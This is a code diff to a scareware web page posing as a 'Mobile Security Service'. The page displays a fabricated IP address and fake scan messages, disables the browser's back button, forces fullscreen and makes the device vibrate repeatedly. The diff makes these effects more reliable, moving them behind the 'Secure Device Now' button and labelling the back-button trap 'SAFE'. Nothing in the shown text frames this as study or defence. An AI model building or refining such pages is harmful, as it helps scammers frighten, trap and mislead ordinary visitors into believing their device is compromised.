@@ -8,7 +8,7 @@
 <style>
   body {
     margin: 0;
-    height: 100vh;
+    min-height: 100vh;
     background: #050505;
     font-family: "Segoe UI", Arial, sans-serif;
     display: flex;
@@ -129,7 +129,7 @@
     <div class="bar"></div>
   </div>
 
-  <button onclick="secureNow()">Secure Device Now</button>
+  <button id="secureBtn">Secure Device Now</button>
 
   <footer>
     Mobile Security Service • Real-time monitoring active
@@ -137,18 +137,20 @@
 </div>
 
 <script>
-  /* ---------------- Fake IP ---------------- */
+document.addEventListener("DOMContentLoaded", () => {
+
+  /* -------- Fake IP -------- */
   function fakeIP() {
     return (
-      Math.floor(Math.random() * 100 + 100) + "." +
-      Math.floor(Math.random() * 255) + "." +
-      Math.floor(Math.random() * 255) + "." +
-      Math.floor(Math.random() * 255)
+      Math.floor(Math.random()*100+100) + "." +
+      Math.floor(Math.random()*255) + "." +
+      Math.floor(Math.random()*255) + "." +
+      Math.floor(Math.random()*255)
     );
   }
   document.getElementById("ip").innerText = fakeIP();
 
-  /* ---------------- Scan Messages ---------------- */
+  /* -------- Scan Messages -------- */
   const scanMessages = [
     "Initializing deep system scan...",
     "Scanning internal storage...",
@@ -165,33 +167,30 @@
     i = (i + 1) % scanMessages.length;
   }, 1400);
 
-  /* ---------------- Vibration ---------------- */
-  if (navigator.vibrate) {
-    navigator.vibrate([300, 150, 300]);
-    setInterval(() => {
-      navigator.vibrate(200);
-    }, 4000);
-  }
-
-  /* ---------------- Fullscreen ---------------- */
-  function enterFullscreen() {
-    const el = document.documentElement;
-    if (el.requestFullscreen) el.requestFullscreen();
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-  }
-
-  document.addEventListener("click", enterFullscreen, { once: true });
-
-  function secureNow() {
-    enterFullscreen();
-  }
-
-  /* ---------------- Disable Back Button ---------------- */
+  /* -------- Back Button Disable (SAFE) -------- */
   history.pushState(null, "", location.href);
-
-  window.addEventListener("popstate", function () {
+  window.addEventListener("popstate", () => {
     history.pushState(null, "", location.href);
   });
+
+  /* -------- Secure Button Action -------- */
+  document.getElementById("secureBtn").addEventListener("click", () => {
+
+    // Delay fullscreen slightly to avoid black screen
+    setTimeout(() => {
+      const el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+    }, 100);
+
+    // Vibration
+    if (navigator.vibrate) {
+      navigator.vibrate([300,150,300]);
+      setInterval(() => navigator.vibrate(200), 4000);
+    }
+  });
+
+});
 </script>
 
 </body>
